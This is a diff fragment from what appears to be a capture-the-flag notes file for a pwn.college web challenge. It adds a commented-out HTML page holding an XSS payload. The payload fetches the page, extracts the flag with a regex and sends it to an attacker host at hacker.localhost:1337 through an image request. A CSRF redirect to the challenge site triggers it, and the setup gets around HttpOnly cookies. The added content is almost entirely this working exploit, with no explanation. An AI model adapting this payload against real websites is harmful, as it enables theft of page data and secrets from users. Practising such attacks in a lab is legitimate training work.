@@ -70,5 +70,23 @@ _________________payload____________
 
 
 
+________payload for flag capture when cookies are http only________
+//<!DOCTYPE html>
+//<html>
+//<body>
+//    <script>
+//        // Build the XSS payload
+//        var xss_payload = '<img src=x onerror="' + 
+//            'fetch(\'/\').then(r=>r.text()).then(html=>{' +
+//            'var m=html.match(/pwn\\.college\\{[^}]+\\}/);' +
+//            'if(m)new Image().src=\'http://hacker.localhost:1337/\'+encodeURIComponent(m[0])' +
+//            '})' +
+//            '">';
+//        
+//        // Trigger the CSRF
+//        window.location.href = "http://challenge.localhost/ephemeral?msg=" + encodeURIComponent(xss_payload);
+//    </script>
+//</body>
+//</html>
 
 
